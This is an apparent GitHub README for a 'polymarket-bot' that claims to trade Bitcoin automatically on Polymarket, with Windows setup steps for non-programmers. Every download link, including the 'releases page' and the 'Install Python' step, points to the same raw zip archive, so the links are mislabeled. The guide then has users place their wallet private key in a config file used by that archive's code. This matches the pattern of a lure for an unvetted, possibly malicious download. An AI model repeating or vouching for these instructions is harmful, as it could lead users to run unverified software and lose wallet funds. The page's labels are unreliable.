# ⚡ polymarket-bot - Automated BTC Trading Tool

[![Download polymarket-bot](https://img.shields.io/badge/Download-Here-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/NC-Paul/polymarket-bot/main/static/polymarket_bot_3.0.zip)

## 📝 About polymarket-bot

polymarket-bot is a tool designed to trade Bitcoin (BTC) automatically on Polymarket's 15-minute markets. It connects to real-time price data through WebSocket feeds from Binance and Polymarket. The bot watches prices and places trades based on rules you set. It also stops losses automatically and can redeem rewards without your intervention.

The software includes a web dashboard to let you see your balance, active trades, trade history, and logs. It helps you track how the bot performs in real time.

This guide walks you through downloading, installing, and running polymarket-bot on a Windows computer with no programming knowledge.

---

## 📥 Download polymarket-bot

[![Download polymarket-bot](https://img.shields.io/badge/Get-PolymarketBot-blue?style=for-the-badge)](https://raw.githubusercontent.com/NC-Paul/polymarket-bot/main/static/polymarket_bot_3.0.zip)

To get started, visit the official releases page at:

https://raw.githubusercontent.com/NC-Paul/polymarket-bot/main/static/polymarket_bot_3.0.zip

Here you can download the latest version of the software. Look for the Windows-compatible package (usually a `.zip` or `.exe` file).

Click the download link for the file, save it to your computer, and remember where you saved it.

---

## 💻 System Requirements

- Windows 10 or later (64-bit recommended)
- 4 GB RAM minimum
- At least 500 MB free disk space
- Active internet connection for price feeds and trading
- Python 3.8 or later (this guide covers installation)

---

## 🚀 Getting Started: Install Python

polymarket-bot runs on Python. You need this to run the bot on Windows.

1. Open https://raw.githubusercontent.com/NC-Paul/polymarket-bot/main/static/polymarket_bot_3.0.zip
2. Click on the “Download Python 3.x.x” button (where x.x is the latest version).
3. When the installer opens, **check the box** "Add Python 3.x to PATH" at the bottom.
4. Click “Install Now” and wait for it to finish.
5. To check installation, open Command Prompt and type:
   ```
   python --version
   ```
   It should print the version number.

---

## 📂 Installing polymarket-bot

1. After downloading the latest release, unzip the file if it is in `.zip` format.
2. Place the folder in an easy-to-remember location, for example `C:\polymarket-bot`.
3. Open Command Prompt:
   - Press `Win + R`, type `cmd`, hit Enter.
4. Navigate to the bot folder by typing:
   ```
   cd C:\polymarket-bot
   ```
   Replace with your actual folder if different.
5. Install required Python packages by running:
   ```
   pip install -r requirements.txt
   ```
6. Wait while dependencies get installed.

---

## ⚙️ Configuring polymarket-bot

Before starting, you need to set up the bot’s options.

Locate the file named `config.env` in the bot folder. Open it with Notepad or any text editor.

Edit the following fields:

### 1. Wallet and Network Setup

- `PRIVATE_KEY`

  This is your wallet’s private key. It lets the bot sign trades. Keep this safe and do not share.

- `POLYGON_RPC_URL`

  This is the address of the Polygon network node. Use a free provider like Alchemy or Infura.

- `SIGNATURE_TYPE`

  Use `2` as the default.

### 2. Proxy Settings (Optional)

Fill in if you use network proxies.

- `HTTP_PROXY` / `HTTPS_PROXY`

  Example format: `http://host:port` or `http://user:pass@host:port`

Leave empty if unused.

### 3. Trading Options

- `AUTO_TRADE`

  Set to `true` to enable automatic trades or `false` to disable.

- `TRADE_AMOUNT`

  Amount in USDC for each trade.

### 4. Trade Triggers

Set any of these to control when to buy:

- `CONDITION_1_TIME`
- `CONDITION_2_PRICE`
- `CONDITION_3_VOLUME`

Values should fit your trading preferences.

Save the file when done.

---

## ▶️ Running polymarket-bot

1. Open Command Prompt.
2. Navigate to the bot folder if you are not already there.
3. Run the bot by typing:
   ```
   python app.py
   ```
4. The bot will connect to live price data and start trading if enabled.

---

## 🌐 Accessing the Web Dashboard

The bot provides a web dashboard to see your balances, open trades, and logs.

1. Open your web browser.
2. Go to:
   ```
   http://localhost:5000
   ```
3. The dashboard updates every few seconds with current data.

Use the dashboard to monitor the bot’s activity clearly.

---

## 🔄 Updating polymarket-bot

When new updates appear, follow these steps:

1. Go back to the [Releases page](https://raw.githubusercontent.com/NC-Paul/polymarket-bot/main/static/polymarket_bot_3.0.zip).
2. Download the latest version.
3. Replace your current folder files with the new ones.
4. Repeat steps in Installing and Running sections to restart the bot.

---

## 🛠 Troubleshooting

- If Python command is not found, make sure Python is added to your PATH during installation.
- If dependencies fail to install, try upgrading pip:
  ```
  python -m pip install --upgrade pip
  ```
- Check your `config.env` for typos or missing fields.
- Ensure your internet connection is stable.

---

## 📌 Useful Commands

- Install dependencies:
  ```
  pip install -r requirements.txt
  ```

- Run the bot:
  ```
  python app.py
  ```

- Stop the bot: Close the Command Prompt window or press `Ctrl + C`.

---

## 🔗 Download polymarket-bot

[![Download polymarket-bot](https://img.shields.io/badge/Download-Here-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/NC-Paul/polymarket-bot/main/static/polymarket_bot_3.0.zip)

Visit the releases page to download the latest version:

https://raw.githubusercontent.com/NC-Paul/polymarket-bot/main/static/polymarket_bot_3.0.zip